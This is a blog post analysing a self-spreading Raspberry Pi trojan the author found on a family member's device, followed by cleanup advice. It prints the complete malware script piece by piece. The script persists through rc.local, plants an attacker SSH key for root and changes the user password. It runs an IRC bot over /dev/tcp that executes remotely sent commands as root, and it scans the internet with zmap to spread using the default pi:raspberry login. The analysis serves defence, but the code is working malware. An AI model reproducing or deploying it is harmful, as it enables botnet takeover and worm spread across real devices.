---
layout: post
title:  "Raspberry Pi Trojan"
date:   2017-11-06
categories: update
---

This weekend, me and my girlfriend visited her parents, and at the same time, I
got to do the usual IT admin work on the Raspberry Pi 3 I set up for her father.
Interestingly, there was a pi-specific trojan installed on his system. I'll walk
you through it!

### Some notes before we start
This script is raspberry pi specific, and relies on that the raspberry pi has a
default password (which is "raspberry") and that sudo is set up so that no
password is needed (which is also the default in raspbian).

### The script

{% highlight bash %}
#!/bin/bash

MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG

if [ "$EUID" -ne 0 ]
then
    NEWMYSELF=`mktemp -u 'XXXXXXXX'`
    sudo cp $MYSELF /opt/$NEWMYSELF
    sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
    sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
    sudo sh -c "echo 'exit 0' >> /etc/rc.local"
    sleep 1
    sudo reboot
else
{% endhighlight %}

If the script isn't running as root, then it creates a copy of itself in /opt
and tells `rc.local` to run the script during boot. Then it reboots the pi,
causing it to execute the script as root on boot.

{% highlight bash %}
TMP1=`mktemp`
echo $TMP1 >> $DEBUG

killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl
{% endhighlight %}

In case the computer was already compromised as a miner or some other nasty
programs, let's turn them off. But before that it echoes some data to `$DEBUG`,
which is set to `/dev/null`. Presumably, this was only used while developing the
script.

Next comes the more nasty parts.

{% highlight bash %}
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc
{% endhighlight %}

Ok, host aliasing and removing any shell definitions. I assume, to avoid
problems in the future with other aliases etc etc.

{% highlight bash %}
usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
{% endhighlight %}

Changes the password of the pi user to something else (this is not the actual
password, this is the encrypted password

{% highlight bash %}
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys
{% endhighlight %}

Allow root to log in using an ssh key

{% highlight bash %}
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten

cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER
{% endhighlight %}

Adds another name server, removes some directories if they were there, and
stores a public key as `/tmp/public.pem`. You will soon see why.

{% highlight bash %}
BOT=`mktemp -u 'XXXXXXXX'`

cat > /tmp/$BOT <<'EOFMARKER'
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

    arr[0]="ix1.undernet.org"
    arr[1]="ix2.undernet.org"
    arr[2]="Ashburn.Va.Us.UnderNet.org"
    arr[3]="Bucharest.RO.EU.Undernet.Org"
    arr[4]="Budapest.HU.EU.UnderNet.org"
    arr[5]="Chicago.IL.US.Undernet.org"
    rand=$[$RANDOM % 6]
    svr=${arr[$rand]}

    eval 'exec 3<>/dev/tcp/$svr/6667;'
    if [[ ! "$?" -eq 0 ]] ; then
            continue
    fi

    echo $NICK

    eval 'printf "NICK $NICK\r\n" >&3;'
    if [[ ! "$?" -eq 0 ]] ; then
            continue
    fi
    eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
    if [[ ! "$?" -eq 0 ]] ; then
        continue
    fi

    # Main loop
    while [ true ]; do
        eval "read msg_in <&3;"

        if [[ ! "$?" -eq 0 ]] ; then
            break
        fi

        if  [[ "$msg_in" =~ "PING" ]] ; then
            printf "PONG %s\n" "${msg_in:5}";
            eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
            if [[ ! "$?" -eq 0 ]] ; then
                break
            fi
            sleep 1
            eval 'printf "JOIN #biret\r\n" >&3;'
            if [[ ! "$?" -eq 0 ]] ; then
                break
            fi
        elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
            privmsg_h=$(echo $msg_in| cut -d':' -f 3)
            privmsg_data=$(echo $msg_in| cut -d':' -f 4)
            privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

            hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
            sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

            if [[ "$sign" == "$hash" ]] ; then
                CMD=`echo $privmsg_data | base64 -d -i`
                RES=`bash -c "$CMD" | base64 -w 0`
                eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
                if [[ ! "$?" -eq 0 ]] ; then
                    break
                fi
            fi
        fi
    done
done
EOFMARKER

chmod +x /tmp/$BOT
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep 3
rm -rf /tmp/$BOT
{% endhighlight %}

Well, what do you know - an IRC bot? It creates a nick using `uname -a | md5sum`
(which is stupid, there are probably lots of pi users that would get the same
output from `uname -a`), then tries to connect to a random undernet server,
talks IRC properly setting NAME and USER and so on. Once connected, it responds
to PING if needed, and then joins #biret, where it listens for commands to
execute.

When it gets a command, it makes sure the command is signed using the public key
we saw earlier, and in case of a match, it executes whatever command was sent in
the message. Being that this would run as root, it means unrestricted access to
the compromised system.

The last parts of this snippet is just making the bot script runnable, starting
it (with logging, nice!), letting it run for three seconds, then deleting it
(while it runs, leaving no traces except the log, it seems).

{% highlight bash %}
NAME=`mktemp -u 'XXXXXXXX'`

date > /tmp/.s

apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

while [ true ]; do
    FILE=`mktemp`
    zmap -p 22 -o $FILE -n 100000
    killall ssh scp
    for IP in `cat $FILE`
    do
        sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
        sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
    done
    rm -rf $FILE
    sleep 10
done

fi
{% endhighlight %}

The final touches, install sshpass and zmap. zmap is apparently like nmap, but
targeted for scanning the whole internet. sshpass is used to be able to use
password authentication over ssh in a non-interactive way.

It then runs zmap and saves its results to a file. It goes through the file, and
for each entry, tries to log in with `pi:raspberry` as credentials (assuming it
is a raspberry pi), and effectively copies itself to the new host.

### How to get rid of it
This is a tricky one, given that the IRC bot might have accepted any commands.
What I did was simply to remove the script and any files it had touched,
restoring `rc.local`, the root user's ssh directory and so on. Some reboots and
there were no apparent traces of it left on the system.

What any reasonable person SHOULD do is: wipe the pi and reinstall. I would have
done that if I had an sd card reader with me. I might do it on next visit. But
for now, this seemed enough.

